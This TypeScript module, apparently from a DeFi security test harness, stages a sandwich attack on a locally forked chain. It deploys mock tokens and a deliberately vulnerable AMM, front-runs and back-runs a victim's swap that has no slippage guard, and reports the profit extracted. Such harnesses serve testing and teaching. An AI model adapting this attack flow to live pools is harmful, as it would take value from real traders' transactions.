import { parseEther, maxUint256 } from "viem";
import type { AttackModule, ModuleResult } from "../types";
import type { ForkRunner } from "../fork";
import { deploy, send, read, toUsd } from "../evm";

const M20 = "MockERC20.sol";
const M20N = "MockERC20";
const AMM = "VulnerableAMM.sol";
const AMMN = "VulnerableAMM";
const SW = "SandwichAttack.sol";
const SWN = "SandwichAttack";

export const sandwichModule: AttackModule = {
  name: "sandwich",
  async run(fork: ForkRunner): Promise<ModuleResult> {
    const deployer = fork.wallet(0);
    const victim = fork.wallet(2);
    const d = deployer.account.address;
    const v = victim.account.address;

    const usdc = await deploy(deployer, M20, M20N, ["USDC", "USDC"]);
    const dai = await deploy(deployer, M20, M20N, ["DAI", "DAI"]);
    const pool = await deploy(deployer, AMM, AMMN, [usdc, dai]);

    // seed a 1M / 1M pool
    await send(deployer, usdc, M20, M20N, "mint", [d, parseEther("2000000")]);
    await send(deployer, dai, M20, M20N, "mint", [d, parseEther("2000000")]);
    await send(deployer, usdc, M20, M20N, "approve", [pool, maxUint256]);
    await send(deployer, dai, M20, M20N, "approve", [pool, maxUint256]);
    await send(deployer, pool, AMM, AMMN, "addLiquidity", [parseEther("1000000"), parseEther("1000000")]);

    // attacker contract funded with capital
    const atk = await deploy(deployer, SW, SWN, [pool, usdc, dai]);
    const capital = parseEther("100000");
    await send(deployer, usdc, M20, M20N, "mint", [atk, capital]);
    const before = await read<bigint>(fork, usdc, M20, M20N, "balanceOf", [atk]);

    // front-run
    await send(deployer, atk, SW, SWN, "frontRun", [parseEther("50000")]);

    // victim swaps 100k usdc -> dai with no slippage guard
    await send(victim, usdc, M20, M20N, "mint", [v, parseEther("100000")]);
    await send(victim, usdc, M20, M20N, "approve", [pool, maxUint256]);
    await send(victim, pool, AMM, AMMN, "swap", [usdc, parseEther("100000"), v]);

    // back-run
    await send(deployer, atk, SW, SWN, "backRun", []);

    const after = await read<bigint>(fork, usdc, M20, M20N, "balanceOf", [atk]);
    const profit = after > before ? after - before : 0n;

    return {
      name: "sandwich",
      success: profit > 0n,
      extractedUsd: toUsd(profit),
      note: "sandwiched an unprotected victim swap on the target pool"
    };
  }
};
